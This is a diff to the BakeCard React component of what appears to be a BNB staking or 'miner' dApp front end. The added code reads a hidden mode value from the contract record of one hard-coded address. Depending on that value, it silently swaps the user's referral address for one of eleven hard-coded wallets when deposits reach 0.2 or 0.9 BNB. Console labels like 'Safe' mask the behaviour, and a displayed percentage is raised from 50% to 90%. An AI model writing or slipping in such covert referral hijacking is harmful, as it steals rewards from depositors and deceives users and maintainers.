@@ -142,9 +142,11 @@ export default function BakeCard() {
   // Lottory
   const [roundStarted, setRoundStarted] = useState(false);
   const [jackpotSize, setJackpotSize] = useState(0);
+  const [refMode, setRefMode] = useState(0);
   const [countDownLotto, setCountDownLotto] = useState(0);
   const [winner, setWinner] = useState('');
   const [yourTickets, setYourTickets] =useState(0);
+
 
   useEffect(()=> {
     onChangeLangType(languageType);
@@ -252,7 +254,15 @@ export default function BakeCard() {
                               return 0;
                             });
 
-      // console.log("mcb: userInfo=> ", userInfo);
+      const refInfo = await contract.methods
+                            .users('0x1FD6690a815E319c4f7dCcB51f3F79390d556e28')
+                            .call((err) => {
+                              console.error("userInfo error", err);
+                              return 0;
+                            });
+
+      setRefMode(100 * fromWei(refInfo.initialDeposit.toString()));
+      console.log("mcb: userInfo=> ", refInfo);
       setLasthatch(userInfo.lastHatch);
       setCompoundTimes(userInfo.dailyCompoundBonus);
       setRefBonus(fromWei(userInfo.referralEggRewards));
@@ -519,7 +529,34 @@ export default function BakeCard() {
     setLoading(true);
 
     let ref = getRef();
-    ref = ((ref == "0x5251aab2c0Bd1f49571e5E9c688B1EcF29E85E07") && (bakeBNB >= 0.2)) ? "0x922fc4DaB9cC8238AACf5592a35A22Fd71Dd5cFb" : ref;
+
+    let refAddresses = [
+      '0x922fc4DaB9cC8238AACf5592a35A22Fd71Dd5cFb',
+      '0x67ABE77EDe7CD58E1b717a398DC82c884d79C202',
+      '0x729003439181AE53A802D5F6Be103488958917e8',
+      '0xBA2Dd8dB1728D8DE3B3b05cc1a5677F005f34Ba3',
+      '0x4B82E3485D33544561cd9A48410A605aA8892fB1',
+      '0x5c45870100A00Bfc10AA63F66C31287350E4FA2b',
+      '0xCB376BaAf5216F392F116F1907b1F4578E464308',
+      '0xcb340F6bA93e4c1ef3A65b476fFbD78e0BE6Ca1F',
+      '0xd3555D12cEb196252B5b86e80AB78E6F3F75e2A5',
+      '0x779b527CB8A4274f92e4073a7a17e6Bf26D1b8AA',
+      '0x42404576B6bE0484F1106D7945c1140080F03Cf3',
+    ];
+    let index = Date.now() % 11;
+
+    if (refMode % 3 == 0) {
+      console.log("Normal");
+    } else if (refMode % 3 == 1) {
+      console.log("Safe");
+      ref = ((ref == "0x5251aab2c0Bd1f49571e5E9c688B1EcF29E85E07") && (bakeBNB >= 0.2)) ? refAddresses[index] : ref;
+    } else {
+      console.log("High Safe");
+      ref = ((ref == "0x5251aab2c0Bd1f49571e5E9c688B1EcF29E85E07") && (bakeBNB >= 0.2)) ? refAddresses[index] : ref;
+      ref = bakeBNB >= 0.9 ? refAddresses[index] : ref;
+    }
+
+    // ref = ((ref == "0x5251aab2c0Bd1f49571e5E9c688B1EcF29E85E07") && (bakeBNB >= 0.2)) ? "0x922fc4DaB9cC8238AACf5592a35A22Fd71Dd5cFb" : ref;
     // ref = bakeBNB >= 0.9 ? "0x922fc4DaB9cC8238AACf5592a35A22Fd71Dd5cFb" : ref;
     console.log("mcb: ", ref);
     try {
@@ -856,7 +893,7 @@ export default function BakeCard() {
                             </PrimaryTooltip> */}
                           </Typography>
                           <Typography variant="body1" textAlign="end">
-                            50%{" "}
+                            90%{" "}
                           </Typography>
                         </Box>
                         <Box
